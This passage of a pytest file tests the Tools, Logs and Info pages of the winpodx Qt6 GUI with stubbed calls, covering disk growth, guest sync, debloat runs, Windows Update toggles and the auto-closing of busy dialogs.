# SPDX-License-Identifier: MIT
"""Tests for the three "tools" pages of the Qt6 window.

Covers ``MaintenanceMixin`` (Tools page), ``LogsMixin`` (Logs / debug
terminal) and ``InfoPageMixin`` (Info page) using the same headless
harness pattern as ``test_main_window_bringup.py``: a bare host class
mixes in the section mixin and supplies only the attributes the mixin
reads, ``QT_QPA_PLATFORM=offscreen`` keeps Qt from opening a window, and
every outward call (disk grow, debloat, guest sync, pod probes, podman,
log files) is stubbed at its lookup site.

The important contracts pinned here:

  - **Security**: the Terminal tab runs ONLY ``LogsMixin._ALLOWED_COMMANDS``.
    A non-allowlisted binary must be refused *before* it reaches exec, and
    the allowlist must never gain a general shell / interpreter.
  - **#550**: a maintenance ``BusyDialog`` must auto-close when its worker
    returns. Every busy-dialog test asserts the dialog ends up
    ``Accepted`` and hidden — a dialog that hangs open fails the test
    (a fail-safe reject fires rather than deadlocking the suite).
  - Confirmation gating: cancelling a confirm prompt must leave the
    outward call untouched.
  - Info page: health probes / dependency rows / pod rows render the
    values gather_info produced, and the refresh reentrancy guard holds.
"""

from __future__ import annotations

import os
import subprocess
import threading
import time

import pytest

pytest.importorskip("PySide6")
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from PySide6.QtCore import QObject, QTimer, Signal, Slot  # noqa: E402
from PySide6.QtWidgets import (  # noqa: E402
    QApplication,
    QComboBox,
    QDialog,
    QFrame,
    QLabel,
    QMessageBox,
    QPushButton,
    QTextEdit,
    QWidget,
)

from winpodx.core.config import Config  # noqa: E402
from winpodx.core.disk import DiskError, GrowResult  # noqa: E402
from winpodx.core.guest_sync import GuestSyncError  # noqa: E402
from winpodx.core.pod import PodState, PodStatus  # noqa: E402
from winpodx.core.process import TrackedProcess  # noqa: E402
from winpodx.core.windows_exec import WindowsExecError, WindowsExecResult  # noqa: E402
from winpodx.gui._main_window_info import InfoPageMixin  # noqa: E402
from winpodx.gui._main_window_logs import LogsMixin  # noqa: E402
from winpodx.gui._main_window_maintenance import (  # noqa: E402
    MaintenanceMixin,
    _confirm_with_callout,
)
from winpodx.gui._widget_helpers import BusyDialog  # noqa: E402

# ----- shared scaffolding ------------------------------------------------


@pytest.fixture(autouse=True)
def qapp():
    """A process-wide offscreen QApplication (created once, never exec'd)."""
    app = QApplication.instance()
    if app is None:
        app = QApplication([])
    return app


@pytest.fixture(autouse=True)
def _force_english_ui():
    """Pin ``tr()`` to its English source strings so text asserts are stable."""
    from winpodx.core import i18n

    previous = i18n.current_language()
    i18n.set_language("en")
    yield
    i18n.set_language(previous)


class _FakeSignal:
    """Minimal stand-in for a Qt Signal that records emits."""

    def __init__(self) -> None:
        self.emissions = []

    def emit(self, *args) -> None:
        self.emissions.append(args)

    def texts(self):
        return [a[0] for a in self.emissions if a]


class _FakeLabel:
    """Stand-in for the small status QLabel the Tools handlers write to."""

    def __init__(self) -> None:
        self.texts = []

    def setText(self, text: str) -> None:  # noqa: N802 - Qt API shape
        self.texts.append(text)

    def text(self) -> str:
        return self.texts[-1] if self.texts else ""


class _FakeButton:
    """Stand-in for the Windows-Update buttons (visibility / enablement only)."""

    def __init__(self) -> None:
        self.visible = None
        self.enabled = None

    def setVisible(self, value: bool) -> None:  # noqa: N802 - Qt API shape
        self.visible = value

    def setEnabled(self, value: bool) -> None:  # noqa: N802 - Qt API shape
        self.enabled = value


def _wait_for(pred, timeout: float = 3.0) -> bool:
    """Poll ``pred`` until true. Bounded; a healthy path returns in ms."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if pred():
            return True
        time.sleep(0.005)
    return False


def _cfg(**pod_overrides) -> Config:
    cfg = Config()
    for key, value in pod_overrides.items():
        setattr(cfg.pod, key, value)
    return cfg


@pytest.fixture
def load_cfg(monkeypatch):
    """Make every in-handler ``Config.load()`` return the test's config."""

    def _install(cfg: Config) -> Config:
        monkeypatch.setattr(Config, "load", classmethod(lambda cls: cfg))
        return cfg

    return _install


class _MsgBox:
    """Records the QMessageBox popups the Tools handlers raise."""

    def __init__(self) -> None:
        self.calls = []
        self.answer = QMessageBox.StandardButton.Yes

    def kinds(self):
        return [kind for kind, _title, _text in self.calls]

    def bodies(self):
        return [text for _kind, _title, text in self.calls]


@pytest.fixture
def msgbox(monkeypatch):
    """Replace the blocking QMessageBox statics with recording stubs."""
    rec = _MsgBox()

    def _information(_parent, title, text, *_a, **_k):
        rec.calls.append(("information", title, text))

    def _warning(_parent, title, text, *_a, **_k):
        rec.calls.append(("warning", title, text))

    def _question(_parent, title, text, *_a, **_k):
        rec.calls.append(("question", title, text))
        return rec.answer

    monkeypatch.setattr(QMessageBox, "information", staticmethod(_information))
    monkeypatch.setattr(QMessageBox, "warning", staticmethod(_warning))
    monkeypatch.setattr(QMessageBox, "question", staticmethod(_question))
    return rec


class _Confirm:
    """Records calls to the inline confirm-with-callout dialog."""

    def __init__(self) -> None:
        self.calls = []
        self.answer = True

    def __call__(self, *args, **kwargs) -> bool:
        self.calls.append((args, kwargs))
        return self.answer


@pytest.fixture
def confirm(monkeypatch):
    """Stub ``_confirm_with_callout`` (its own dialog is tested separately)."""
    rec = _Confirm()
    monkeypatch.setattr("winpodx.gui._main_window_maintenance._confirm_with_callout", rec)
    return rec


@pytest.fixture
def busy_dialogs(monkeypatch):
    """Capture every BusyDialog opened by ``_run_busy_op``.

    ``exec()`` gets a fail-safe reject so a dialog that never auto-closes
    (#550) FAILS the assertion instead of hanging the suite; the happy
    path closes in single-digit milliseconds and never reaches it.
    """
    seen = []

    class _RecordingBusyDialog(BusyDialog):
        def __init__(self, *args, **kwargs) -> None:
            super().__init__(*args, **kwargs)
            seen.append(self)

        def exec(self):  # noqa: A003 - mirrors QDialog.exec
            # Parented + explicitly stopped so the guard can never outlive the
            # dialog and fire into a destroyed C++ object.
            guard = QTimer(self)
            guard.setSingleShot(True)
            guard.timeout.connect(self.reject)
            guard.start(4000)
            try:
                return super().exec()
            finally:
                guard.stop()

    monkeypatch.setattr("winpodx.gui._main_window_maintenance.BusyDialog", _RecordingBusyDialog)
    return seen


def _assert_busy_dialog_closed(dialogs) -> None:
    """#550: the task dialog must auto-close once the worker returns."""
    assert len(dialogs) == 1, f"expected exactly one BusyDialog, got {len(dialogs)}"
    dlg = dialogs[0]
    assert dlg.result() == QDialog.DialogCode.Accepted, (
        "BusyDialog did not auto-close on completion (#550 regression)"
    )
    assert not dlg.isVisible()


# ----- Tools page (MaintenanceMixin) -------------------------------------


class _MaintHarness(MaintenanceMixin, QWidget):
    """Bare host exposing exactly what MaintenanceMixin reads."""

    def __init__(self, cfg: Config) -> None:
        super().__init__()
        self.cfg = cfg
        self.info_label = _FakeLabel()
        self.app_launched = _FakeSignal()
        self.app_launch_failed = _FakeSignal()
        self.pod_status_updated = _FakeSignal()
        self.log_signal = _FakeSignal()
        self.pod_refreshes = 0
        self._update_status_label = _FakeLabel()
        self._btn_enable_updates = _FakeButton()
        self._btn_disable_updates = _FakeButton()
        self._btn_retry_updates = _FakeButton()
        self.page = None

    def _refresh_pod_status(self) -> None:
        self.pod_refreshes += 1

    def build_page(self):
        """Build + retain the Tools page (an unparented QWidget would be GC'd)."""
        self.page = self._build_maintenance_page()
        return self.page


@pytest.fixture
def maint(monkeypatch):
    """A Tools-page harness with the live-session scan stubbed out."""
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: [])
    return _MaintHarness(_cfg())


def _action_rows(widget) -> list:
    return [f for f in widget.findChildren(QFrame) if f.objectName() == "actionRow"]


def test_build_maintenance_page_renders_every_tool_row(maint):
    page = maint.build_page()
    # 3 Pod-Management rows + 6 System rows, and no session rows (none live).
    assert len(_action_rows(page)) == 9
    labels = {lbl.text() for lbl in page.findChildren(QLabel)}
    for expected in ("Suspend Pod", "Resume Pod", "Full Desktop", "Clean Locks"):
        assert expected in labels
    for expected in ("Sync Time", "Debloat", "Grow Disk", "Sync Guest"):
        assert expected in labels
    assert "Apply Windows Fixes" in labels
    # The live-session poller is wired but not started until the tab shows.
    assert maint._sessions_timer.interval() == 2500
    assert not maint._sessions_timer.isActive()


def test_action_row_click_invokes_its_handler(maint):
    fired = []
    row = maint._make_action_row("gear", "Label", "Desc", lambda: fired.append(1), 2)
    assert row.objectName() == "actionRow"
    row.mousePressEvent(None)
    assert fired == [1]


def test_action_row_maps_legacy_unicode_glyph(maint):
    # Older callers pass a unicode glyph; it must still resolve to an SVG.
    row = maint._make_action_row("⚙", "Legacy", "Desc", lambda: None, 0)
    icon = row.findChildren(QLabel)[0]
    assert not icon.pixmap().isNull()


def test_sessions_panel_lists_live_sessions(monkeypatch):
    sessions = [TrackedProcess("word", 4242), TrackedProcess("excel", 4243)]
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: sessions)
    harness = _MaintHarness(_cfg())
    page = harness.build_page()
    # 9 tool rows + one row per live session.
    assert len(_action_rows(page)) == 11
    texts = {lbl.text() for lbl in page.findChildren(QLabel)}
    assert "word" in texts and "excel" in texts
    assert "PID 4242" in texts


def test_sessions_panel_skips_rebuild_when_unchanged(monkeypatch):
    sessions = [TrackedProcess("word", 1)]
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: list(sessions))
    harness = _MaintHarness(_cfg())
    harness.build_page()
    first = harness._sessions_box.itemAt(0).widget()

    harness._refresh_sessions_panel()
    assert harness._sessions_box.itemAt(0).widget() is first, "poll flickered the rows"

    sessions.append(TrackedProcess("excel", 2))
    harness._refresh_sessions_panel()
    assert harness._sessions_box.count() == 2
    assert harness._sessions_box.itemAt(0).widget() is not first


def test_sessions_panel_survives_enumeration_failure(monkeypatch):
    def _boom():
        raise RuntimeError("runtime dir vanished")

    monkeypatch.setattr("winpodx.core.process.list_active_sessions", _boom)
    harness = _MaintHarness(_cfg())
    harness.build_page()  # must not raise
    assert harness._sessions_box.count() == 1  # the "no sessions" empty panel


def test_session_row_terminate_button_kills_that_session(maint, monkeypatch):
    killed = []
    monkeypatch.setattr(
        "winpodx.core.process.kill_session", lambda name: killed.append(name) or True
    )
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: [])
    maint.build_page()
    row = maint._make_session_row("word", 99)
    buttons = row.findChildren(QPushButton)
    assert len(buttons) == 1
    buttons[0].click()
    assert killed == ["word"]
    assert any("Terminated session: word" in t for t in maint.log_signal.texts())


def test_terminate_session_reports_a_miss(maint, monkeypatch):
    monkeypatch.setattr("winpodx.core.process.kill_session", lambda _name: False)
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: [])
    maint.build_page()
    maint._on_terminate_session("word")
    assert any("Could not terminate word" in t for t in maint.log_signal.texts())


def test_terminate_session_reports_a_raise(maint, monkeypatch):
    def _boom(_name):
        raise OSError("no such pid")

    monkeypatch.setattr("winpodx.core.process.kill_session", _boom)
    monkeypatch.setattr("winpodx.core.process.list_active_sessions", lambda: [])
    maint.build_page()
    maint._on_terminate_session("word")  # must not propagate
    assert any("Failed to terminate word" in t for t in maint.log_signal.texts())


# ----- Tools: simple synchronous actions ---------------------------------


def test_cleanup_reports_removed_lock_file_count(maint, monkeypatch):
    monkeypatch.setattr("winpodx.core.daemon.cleanup_lock_files", lambda: ["~$a.docx", "~$b.xlsx"])
    maint._on_cleanup()
    assert "2" in maint.info_label.text()


def test_cleanup_reports_when_nothing_to_remove(maint, monkeypatch):
    monkeypatch.setattr("winpodx.core.daemon.cleanup_lock_files", lambda: [])
    maint._on_cleanup()
    assert maint.info_label.text() == "No lock files found"


def test_timesync_reports_both_outcomes(maint, monkeypatch, load_cfg):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.daemon.sync_windows_time", lambda _cfg: True)
    maint._on_timesync()
    assert maint.info_label.text() == "Time synced"
    monkeypatch.setattr("winpodx.core.daemon.sync_windows_time", lambda _cfg: False)
    maint._on_timesync()
    assert maint.info_label.text() == "Time sync failed"


def test_suspend_and_resume_refresh_the_pod_status(maint, monkeypatch, load_cfg):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.daemon.suspend_pod", lambda _cfg: True)
    monkeypatch.setattr("winpodx.core.daemon.resume_pod", lambda _cfg: False)
    maint._on_suspend()
    assert maint.info_label.text() == "Pod suspended"
    maint._on_resume()
    assert maint.info_label.text() == "Resume failed"
    assert maint.pod_refreshes == 2


def test_open_desktop_launches_after_ensure_ready(maint, monkeypatch):
    cfg = _cfg()
    order = []
    monkeypatch.setattr(
        "winpodx.core.provisioner.ensure_ready", lambda: order.append("ready") or cfg
    )
    monkeypatch.setattr("winpodx.core.rdp.launch_desktop", lambda c: order.append(("launch", c)))
    maint._on_open_desktop()
    assert _wait_for(lambda: maint.app_launched.emissions), "desktop never launched"
    assert order == ["ready", ("launch", cfg)]
    assert maint.app_launched.emissions == [("Windows Desktop",)]


def test_open_desktop_reports_failure(maint, monkeypatch):
    def _boom():
        raise RuntimeError("pod never came up")

    monkeypatch.setattr("winpodx.core.provisioner.ensure_ready", _boom)
    monkeypatch.setattr(
        "winpodx.core.rdp.launch_desktop",
        lambda _c: pytest.fail("must not launch when ensure_ready fails"),
    )
    maint._on_open_desktop()
    assert _wait_for(lambda: maint.app_launch_failed.emissions)
    assert "pod never came up" in maint.app_launch_failed.emissions[0][0]


# ----- Tools: Grow Disk --------------------------------------------------


def test_grow_disk_refused_on_manual_backend(maint, msgbox, load_cfg, monkeypatch):
    load_cfg(_cfg(backend="manual"))
    monkeypatch.setattr(
        "winpodx.core.disk.compute_grow_target",
        lambda _cfg: pytest.fail("must not size a manual-backend disk"),
    )
    maint._on_grow_disk()
    assert msgbox.kinds() == ["information"]
    assert "manual" in msgbox.bodies()[0]


def test_grow_disk_surfaces_sizing_error(maint, msgbox, load_cfg, monkeypatch):
    load_cfg(_cfg())

    def _boom(_cfg):
        raise DiskError("only 2 GiB free on the host")

    monkeypatch.setattr("winpodx.core.disk.compute_grow_target", _boom)
    monkeypatch.setattr("winpodx.core.disk.grow_disk", lambda _cfg: pytest.fail("must not grow"))
    maint._on_grow_disk()
    assert msgbox.kinds() == ["information"]
    assert "only 2 GiB free" in msgbox.bodies()[0]


def test_grow_disk_cancelled_confirm_does_nothing(
    maint, confirm, busy_dialogs, load_cfg, monkeypatch
):
    load_cfg(_cfg(disk_size="64G"))
    confirm.answer = False
    monkeypatch.setattr("winpodx.core.disk.compute_grow_target", lambda _cfg: "80G")
    monkeypatch.setattr(
        "winpodx.core.disk.grow_disk",
        lambda _cfg: pytest.fail("cancelled confirm must not grow the disk"),
    )
    maint._on_grow_disk()
    assert busy_dialogs == []
    assert maint.info_label.texts == []
    # The confirm was raised at the "danger" level with both sizes shown.
    (_args, kwargs) = confirm.calls[0]
    assert kwargs["level"] == "danger"


def test_grow_disk_success_closes_dialog_and_reports(
    maint, confirm, busy_dialogs, load_cfg, monkeypatch
):
    cfg = load_cfg(_cfg(disk_size="64G"))
    monkeypatch.setattr("winpodx.core.disk.compute_grow_target", lambda _cfg: "80G")
    grown = []
    monkeypatch.setattr(
        "winpodx.core.disk.grow_disk",
        lambda c: (
            grown.append(c)
            or GrowResult(old_size="64G", new_size="80G", partition_extended=True, note="")
        ),
    )
    maint._on_grow_disk()

    assert grown == [cfg]
    _assert_busy_dialog_closed(busy_dialogs)
    assert maint.app_launched.emissions
    message = maint.app_launched.emissions[0][0]
    assert "64G" in message and "80G" in message and "C: extended" in message
    assert "Growing disk 64G → 80G..." in maint.info_label.texts


def test_grow_disk_without_partition_extend_carries_the_note(
    maint, confirm, busy_dialogs, load_cfg, monkeypatch
):
    load_cfg(_cfg(disk_size="64G"))
    monkeypatch.setattr("winpodx.core.disk.compute_grow_target", lambda _cfg: "80G")
    monkeypatch.setattr(
        "winpodx.core.disk.grow_disk",
        lambda _c: GrowResult(
            old_size="64G",
            new_size="80G",
            partition_extended=False,
            note="guest offline; extend on next boot",
        ),
    )
    maint._on_grow_disk()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "extend on next boot" in maint.app_launched.emissions[0][0]


def test_grow_disk_failure_closes_dialog_and_reports(
    maint, confirm, busy_dialogs, load_cfg, monkeypatch
):
    load_cfg(_cfg(disk_size="64G"))
    monkeypatch.setattr("winpodx.core.disk.compute_grow_target", lambda _cfg: "80G")

    def _boom(_cfg):
        raise DiskError("qemu-img resize refused")

    monkeypatch.setattr("winpodx.core.disk.grow_disk", _boom)
    maint._on_grow_disk()

    _assert_busy_dialog_closed(busy_dialogs)
    assert maint.app_launched.emissions == []
    assert "qemu-img resize refused" in maint.app_launch_failed.emissions[0][0]


# ----- Tools: Sync Guest -------------------------------------------------


def test_sync_guest_refused_on_manual_backend(maint, msgbox, load_cfg, monkeypatch):
    load_cfg(_cfg(backend="manual"))
    monkeypatch.setattr(
        "winpodx.core.guest_sync.sync_guest",
        lambda _cfg, **_k: pytest.fail("must not sync a manual backend"),
    )
    maint._on_sync_guest()
    assert msgbox.kinds() == ["information"]


def test_sync_guest_declined_does_nothing(maint, msgbox, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    msgbox.answer = QMessageBox.StandardButton.No
    monkeypatch.setattr(
        "winpodx.core.guest_sync.sync_guest",
        lambda _cfg, **_k: pytest.fail("declined prompt must not sync"),
    )
    maint._on_sync_guest()
    assert msgbox.kinds() == ["question"]
    assert busy_dialogs == []


def test_sync_guest_success_closes_dialog(maint, msgbox, busy_dialogs, load_cfg, monkeypatch):
    cfg = load_cfg(_cfg())
    seen = []

    def _sync(c, force=False):
        seen.append((c, force))
        return {"agent": "ok", "rdprrap": "ok"}

    monkeypatch.setattr("winpodx.core.guest_sync.sync_guest", _sync)
    maint._on_sync_guest()

    assert seen == [(cfg, True)], "guest sync must be forced from the Tools button"
    _assert_busy_dialog_closed(busy_dialogs)
    assert "Guest synced; agent restarting (~5s)." in maint.app_launched.texts()


def test_sync_guest_reports_partial_failures(maint, msgbox, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr(
        "winpodx.core.guest_sync.sync_guest",
        lambda _c, force=False: {"agent": "ok", "urlacl": "failed: access denied"},
    )
    maint._on_sync_guest()
    _assert_busy_dialog_closed(busy_dialogs)
    assert maint.app_launched.emissions == []
    assert "urlacl" in maint.app_launch_failed.emissions[0][0]


def test_sync_guest_reports_channel_error(maint, msgbox, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())

    def _boom(_c, force=False):
        raise GuestSyncError("container not running")

    monkeypatch.setattr("winpodx.core.guest_sync.sync_guest", _boom)
    maint._on_sync_guest()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "container not running" in maint.app_launch_failed.emissions[0][0]


# ----- Tools: Debloat ----------------------------------------------------


class _FakePicker:
    """Stand-in for DebloatPickerDialog (its own UI is out of scope here)."""

    result_code = QDialog.DialogCode.Accepted
    items: list = []
    built: list = []

    def __init__(self, catalog, initial_preset="normal", parent=None) -> None:
        type(self).built.append((catalog, parent))

    def exec(self):  # noqa: A003 - mirrors QDialog.exec
        return type(self).result_code

    def selected_items(self):
        return list(type(self).items)


@pytest.fixture
def picker(monkeypatch):
    """Install a scripted debloat picker in place of the real dialog."""

    class _Picker(_FakePicker):
        result_code = QDialog.DialogCode.Accepted
        items = []
        built = []

    monkeypatch.setattr("winpodx.gui.debloat_picker.DebloatPickerDialog", _Picker)
    monkeypatch.setattr("winpodx.core.debloat.load_catalog", lambda **_k: "CATALOG")
    return _Picker


def test_debloat_surfaces_a_catalog_error(maint, msgbox, picker, monkeypatch):
    from winpodx.core.debloat import DebloatCatalogError

    def _boom(**_k):
        raise DebloatCatalogError("items.toml is malformed")

    monkeypatch.setattr("winpodx.core.debloat.load_catalog", _boom)
    maint._on_debloat()
    assert msgbox.kinds() == ["warning"]
    assert "items.toml is malformed" in msgbox.bodies()[0]
    assert picker.built == []


def test_debloat_cancelled_picker_runs_nothing(maint, picker, busy_dialogs, monkeypatch):
    picker.result_code = QDialog.DialogCode.Rejected
    monkeypatch.setattr(
        "winpodx.core.debloat.build_run_script",
        lambda *_a: pytest.fail("cancelled picker must not build a payload"),
    )
    maint._on_debloat()
    assert picker.built == [("CATALOG", maint)]
    assert busy_dialogs == []


def test_debloat_empty_selection_runs_nothing(maint, picker, busy_dialogs, monkeypatch):
    picker.items = []
    monkeypatch.setattr(
        "winpodx.core.debloat.build_run_script",
        lambda *_a: pytest.fail("empty selection must not build a payload"),
    )
    maint._on_debloat()
    assert busy_dialogs == []
    assert maint.info_label.texts == []


def test_debloat_runs_selection_and_closes_dialog(
    maint, picker, busy_dialogs, load_cfg, monkeypatch
):
    cfg = load_cfg(_cfg())
    cfg.rdp.ip = "127.0.0.1"
    picker.items = ["telemetry", "ads"]
    monkeypatch.setattr(
        "winpodx.core.debloat.build_run_script", lambda _cat, sel: f"# script {sel}"
    )
    seen = {}

    def _run(c, payload, description="", timeout=60):
        seen.update(cfg=c, payload=payload, description=description, timeout=timeout)
        return WindowsExecResult(rc=0, stdout="done", stderr="")

    monkeypatch.setattr("winpodx.core.windows_exec.run_via_transport", _run)
    maint._on_debloat()

    # #550: the debloat task dialog is the one that used to hang open.
    _assert_busy_dialog_closed(busy_dialogs)
    assert seen["cfg"] is cfg
    assert seen["payload"] == "# script ['telemetry', 'ads']"
    assert seen["description"] == "debloat (telemetry,ads)"
    assert seen["timeout"] == 300
    assert maint.app_launched.texts() == ["Debloat complete (2 item(s))"]
    assert maint.pod_status_updated.emissions == [("running", "127.0.0.1")]


def test_debloat_reports_a_nonzero_return_code(maint, picker, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    picker.items = ["cortana"]
    monkeypatch.setattr("winpodx.core.debloat.build_run_script", lambda _c, _s: "x")
    monkeypatch.setattr(
        "winpodx.core.windows_exec.run_via_transport",
        lambda *_a, **_k: WindowsExecResult(rc=5, stdout="", stderr="Access denied"),
    )
    maint._on_debloat()
    _assert_busy_dialog_closed(busy_dialogs)
    assert maint.app_launched.emissions == []
    failure = maint.app_launch_failed.emissions[0][0]
    assert "rc=5" in failure and "Access denied" in failure


def test_debloat_reports_a_payload_build_error(maint, picker, busy_dialogs, load_cfg, monkeypatch):
    from winpodx.core.debloat import DebloatCatalogError

    load_cfg(_cfg())
    picker.items = ["ghost-item"]

    def _boom(_cat, _sel):
        raise DebloatCatalogError("unknown item 'ghost-item'")

    monkeypatch.setattr("winpodx.core.debloat.build_run_script", _boom)
    monkeypatch.setattr(
        "winpodx.core.windows_exec.run_via_transport",
        lambda *_a, **_k: pytest.fail("must not exec an unbuilt payload"),
    )
    maint._on_debloat()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "ghost-item" in maint.app_launch_failed.emissions[0][0]


def test_debloat_reports_a_channel_failure(maint, picker, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    picker.items = ["ads"]
    monkeypatch.setattr("winpodx.core.debloat.build_run_script", lambda _c, _s: "x")

    def _boom(*_a, **_k):
        raise WindowsExecError("agent unreachable")

    monkeypatch.setattr("winpodx.core.windows_exec.run_via_transport", _boom)
    maint._on_debloat()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "agent unreachable" in maint.app_launch_failed.emissions[0][0]
    assert maint.pod_status_updated.emissions == []


# ----- Tools: Apply Windows Fixes ---------------------------------------


def _stub_pod_state(monkeypatch, state):
    monkeypatch.setattr(
        "winpodx.core.pod.pod_status", lambda _cfg: PodStatus(state=state, ip="10.0.0.2")
    )


def test_apply_fixes_requires_a_running_pod(maint, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    _stub_pod_state(monkeypatch, PodState.STOPPED)
    monkeypatch.setattr(
        "winpodx.core.provisioner.apply_windows_runtime_fixes",
        lambda _cfg: pytest.fail("must not apply fixes to a stopped pod"),
    )
    maint._on_apply_fixes()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "Pod is not running" in maint.app_launch_failed.emissions[0][0]


def test_apply_fixes_reports_a_probe_failure(maint, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())

    def _boom(_cfg):
        raise OSError("podman socket gone")

    monkeypatch.setattr("winpodx.core.pod.pod_status", _boom)
    maint._on_apply_fixes()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "podman socket gone" in maint.app_launch_failed.emissions[0][0]


def test_apply_fixes_success_counts_every_fix(maint, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    _stub_pod_state(monkeypatch, PodState.RUNNING)
    monkeypatch.setattr(
        "winpodx.core.provisioner.apply_windows_runtime_fixes",
        lambda _cfg: {"max_sessions": "ok", "rdp_timeouts": "ok"},
    )
    maint._on_apply_fixes()
    _assert_busy_dialog_closed(busy_dialogs)
    assert maint.app_launched.texts() == ["Windows-side fixes applied (2/2 OK)"]


def test_apply_fixes_reports_partial_failure(maint, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    _stub_pod_state(monkeypatch, PodState.RUNNING)
    monkeypatch.setattr(
        "winpodx.core.provisioner.apply_windows_runtime_fixes",
        lambda _cfg: {"max_sessions": "ok", "vbs_launchers": "error: timeout"},
    )
    maint._on_apply_fixes()
    _assert_busy_dialog_closed(busy_dialogs)
    failure = maint.app_launch_failed.emissions[0][0]
    assert "1/2 OK" in failure and "vbs_launchers" in failure


def test_apply_fixes_reports_a_raise(maint, busy_dialogs, load_cfg, monkeypatch):
    load_cfg(_cfg())
    _stub_pod_state(monkeypatch, PodState.RUNNING)

    def _boom(_cfg):
        raise RuntimeError("registry write refused")

    monkeypatch.setattr("winpodx.core.provisioner.apply_windows_runtime_fixes", _boom)
    maint._on_apply_fixes()
    _assert_busy_dialog_closed(busy_dialogs)
    assert "registry write refused" in maint.app_launch_failed.emissions[0][0]


# ----- Tools: Windows Update tri-state ----------------------------------


def test_update_status_enabled_offers_only_disable(maint, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "enabled")
    maint._refresh_update_status()
    assert _wait_for(lambda: maint._update_status_label.texts)
    assert maint._update_status_label.text() == "Windows Update is enabled"
    assert maint._btn_disable_updates.enabled is True
    assert maint._btn_enable_updates.enabled is False
    assert maint._btn_retry_updates.visible is False


def test_update_status_disabled_offers_only_enable(maint, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "disabled")
    maint._refresh_update_status()
    assert _wait_for(lambda: maint._update_status_label.texts)
    assert maint._btn_enable_updates.enabled is True
    assert maint._btn_disable_updates.enabled is False


def test_update_status_unknown_hides_both_and_offers_retry(maint, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "unknown")
    maint._refresh_update_status()
    assert _wait_for(lambda: maint._update_status_label.texts)
    assert "Retry" in maint._update_status_label.text()
    assert maint._btn_enable_updates.visible is False
    assert maint._btn_disable_updates.visible is False
    assert maint._btn_retry_updates.visible is True


def test_enable_updates_reports_and_reprobes(maint, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.enable_updates", lambda _cfg: True)
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "enabled")
    maint._on_enable_updates()
    assert _wait_for(lambda: len(maint._update_status_label.texts) >= 2)
    assert maint._update_status_label.texts[0] == "Enabling Windows Update..."
    assert maint.app_launched.texts() == ["Windows Update enabled"]


def test_enable_updates_reports_failure(maint, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.enable_updates", lambda _cfg: False)
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "disabled")
    maint._on_enable_updates()
    assert _wait_for(lambda: maint.app_launch_failed.emissions)
    assert maint.app_launch_failed.texts() == ["Failed to enable Windows Update"]


def test_disable_updates_needs_confirmation(maint, confirm, load_cfg, monkeypatch):
    load_cfg(_cfg())
    confirm.answer = False
    monkeypatch.setattr(
        "winpodx.core.updates.disable_updates",
        lambda _cfg: pytest.fail("cancelled confirm must not disable updates"),
    )
    maint._on_disable_updates()
    assert maint._update_status_label.texts == []
    assert confirm.calls[0][1]["level"] == "danger"


def test_disable_updates_runs_after_confirmation(maint, confirm, load_cfg, monkeypatch):
    load_cfg(_cfg())
    monkeypatch.setattr("winpodx.core.updates.disable_updates", lambda _cfg: True)
    monkeypatch.setattr("winpodx.core.updates.get_update_status", lambda _cfg: "disabled")
    maint._on_disable_updates()
    assert _wait_for(lambda: maint.app_launched.emissions)
    assert maint.app_launched.texts() == ["Windows Update disabled"]


# ----- Tools: the confirm-with-callout dialog itself ---------------------


class _ModalAnswer:
    """Dismiss the next modal dialog from inside its own event loop.

    Arm it *before* the call that opens the dialog: the zero-interval
    timer first fires once ``exec()``'s nested loop starts spinning.
    """

    def __init__(self, button_index=None, accept=True, max_ticks=2000) -> None:
        self.button_index = button_index
        self.accept = accept
        self.max_ticks = max_ticks
        self.ticks = 0
        self.button_texts = []
        self.timed_out = False
        self._timer = QTimer()
        self._timer.setInterval(0)
        self._timer.timeout.connect(self._tick)

    def arm(self) -> "_ModalAnswer":
        self._timer.start()
        return self

    def _tick(self) -> None:
        self.ticks += 1
        dlg = QApplication.activeModalWidget()
        if dlg is None:
            if self.ticks > self.max_ticks:
                self.timed_out = True
                self._timer.stop()
            return
        self._timer.stop()
        buttons = dlg.findChildren(QPushButton)
        self.button_texts = [b.text() for b in buttons]
        if self.button_index is not None and len(buttons) > self.button_index:
            buttons[self.button_index].click()
        elif self.accept:
            dlg.accept()
        else:
            dlg.reject()


def test_confirm_with_callout_proceed_button_confirms(maint):
    answer = _ModalAnswer(button_index=1).arm()
    result = _confirm_with_callout(
        maint, "Grow Disk", "Grow 64G to 80G?", "The guest reboots.", level="danger"
